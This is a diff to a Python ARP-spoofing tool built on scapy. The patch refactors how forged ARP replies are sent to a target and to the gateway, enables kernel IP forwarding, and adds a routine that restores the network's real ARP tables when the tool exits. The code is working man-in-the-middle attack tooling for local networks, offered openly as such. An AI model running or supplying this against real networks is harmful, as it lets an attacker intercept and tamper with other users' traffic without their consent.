@@ -3,7 +3,6 @@
 __author__ = 'foxtrot_charlie'
 __licence__ = 'GPLv2'
 
-
 import sys
 import os
 import threading
@@ -12,9 +11,7 @@ import queue
 import time
 from scapy.all import *
 
-
 import utils
-
 
 logger = logging.getLogger("ARPSPOOFER")
 logger.setLevel(logging.DEBUG)
@@ -27,7 +24,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 # DO NOT CHANGE THIS VALUES! USE CONFIG INSTEAD!
 DEFAULT_GATEWAY = '192.168.0.1'
 DEFAULT_NETWORK = "192.168.0.0/24"
-INTERVAL = 20
+REARP_VAL = 10
+INTERVAL = 10
 counter = 0
 
 
@@ -38,6 +36,7 @@ class ARPspoofer(threading.Thread):
     to spoof ARP responses only for a specific target. Another
     option is to spoof whole ARP traffic in the network.
     """
+
     def __init__(self, event, queue, config={}):
         """"""
         threading.Thread.__init__(self)
@@ -60,7 +59,6 @@ class ARPspoofer(threading.Thread):
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         logger.info("Kernel IPv4 forwarding enabled")
         self.__config_load(config)
-
 
     def __config_load(self, config={}):
         """
@@ -97,14 +95,41 @@ class ARPspoofer(threading.Thread):
             cc = 0
             while mac is None:
                 logger.debug('Target {} has MAC: {}'.format(t, mac))
-                if cc > 3:
+                cc += 1
+                mac = utils.arpping(t)
+                if cc > 3 and mac is None:
                     logger.critical('Cannot determine MAC addr of {}'.format(t))
-                    break
+                    raise ValueError('Check if {} addr is correct!'.format(t))
             if mac is not None:
                 self.ip_mac[t] = mac
 
         self.iface = config['iface']
         self.iface_mac = utils.getHwAddr(self.iface)
+
+    def rearp(self):
+        """
+        reARPing method restores correct ARP settings used by target hosts. Messages are sent multiple times to ensure
+        that changes are spotted and applied in ARP tables
+        :return: None
+        """
+        logger.debug('reARPing session started!')
+        cont = True
+        for i in range(REARP_VAL):
+            logger.debug('reARPing iteration: {}'.format(i))
+            for ip, mac in self.ip_mac.items():
+                if self.event.is_set():
+                    cont = False
+                    break
+                vb = 0 if i % 2 == 0 else 1
+                logger.debug('{} is at {} send to {} {}'.format(ip, mac, self.gw, self.ip_mac[self.gw]))
+                ARPspoofer.__send_ARP(ip, mac, self.gw, self.ip_mac[self.gw], vb)
+                logger.debug('{} is at {} send to {} {}'.format(self.gw, self.ip_mac[self.gw], ip, mac))
+                ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, mac, vb)
+
+            if not cont:
+                logger.debug('reARPing canceled!')
+                break
+        logger.debug('reARPing finished...')
 
     def __spoof(self):
         """
@@ -114,28 +139,55 @@ class ARPspoofer(threading.Thread):
         :return: None
         """
         global counter
-        if counter == INTERVAL:
-            print(self.ip_mac.items())
         for ip, mac in self.ip_mac.items():
             if ip == self.gw:
-                continue
+                pass
             # Ether(dst=V_MAC) / ARP(psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
             # pkt = Ether(dst=mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac)
             # send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
             # send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
-            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac, hwsrc=self.iface_mac)
-            sendp(pkt, verbose=0)
-            if counter == INTERVAL:
+            # pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=ip, psrc=self.gw, hwdst=mac,
+            #                                                               hwsrc=self.iface_mac)
+            # sendp(pkt, verbose=0)
+            vb = 1 if counter == INTERVAL else 0
+            ARPspoofer.__send_ARP(ip, mac, self.gw, self.iface_mac, vb)
+            if vb:
                 logger.debug('Sending ARP spoof message! Target: {}'.format(ip))
-                logger.debug('{}'.format(pkt.show(dump=True)))
 
             # p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
             # pkt = Ether(dst=self.ip_mac[self.gw]) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst=self.ip_mac[self.gw])
-            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=self.gw, psrc=ip, hwdst="ff:ff:ff:ff:ff:ff") #self.ip_mac[self.gw])
-            sendp(pkt, verbose=0)
-            if counter == INTERVAL:
+            # pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.iface_mac) / ARP(op=2, pdst=self.gw, psrc=ip,
+            #                                                               hwdst="ff:ff:ff:ff:ff:ff")  # self.ip_mac[self.gw])
+            # sendp(pkt, verbose=0)
+            ARPspoofer.__send_ARP(self.gw, self.ip_mac[self.gw], ip, self.iface_mac, vb)
+            if vb:
                 logger.debug('Sending ARP spoof message to GW with target: {}'.format(ip))
-                logger.debug('{}'.format(pkt.show(dump=True)))
+
+            time.sleep(1.0)
+
+    @staticmethod
+    def __send_ARP(destination_ip, destination_mac, source_ip, source_mac, verbose=0):
+        """
+        Helper static method wrapping creating ARP packet and sendp function from scapy module.
+        :param destination_ip: - IPv4 of a destination host pdst param
+        :param destination_mac: - MAC of a destination host hwdst param
+        :param source_ip: string - IPv4 of a source host psrc param
+        :param source_mac: strin - MAC of a source host hwsrc param
+        :return:
+        """
+        if verbose:
+            logger.debug(
+                'Creating packet ARP: ipsrc: {} hwsrc: {} ipdst: {} hwdst: {}'.format(
+                    source_ip, source_mac, destination_ip, destination_mac)
+            )
+
+        pkt = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+                     psrc=source_ip, hwsrc=source_mac)
+
+        if verbose:
+            logger.debug('Packet created: {}'.format(pkt.show(dump=True)))
+
+        send(pkt, verbose=0)
 
     def __execute_cmd(self, cmd):
         """
@@ -207,6 +259,11 @@ class ARPspoofer(threading.Thread):
             logger.info('Exiting by KeyboardInterrupt')
         finally:
             print("arpspoofer exiting!")
+
+        print("reARPing the network!")
+        logger.debug('reARPing the network')
+        self.rearp()
+        logger.debug('reARPing finished!')
 
     def run(self):
         """
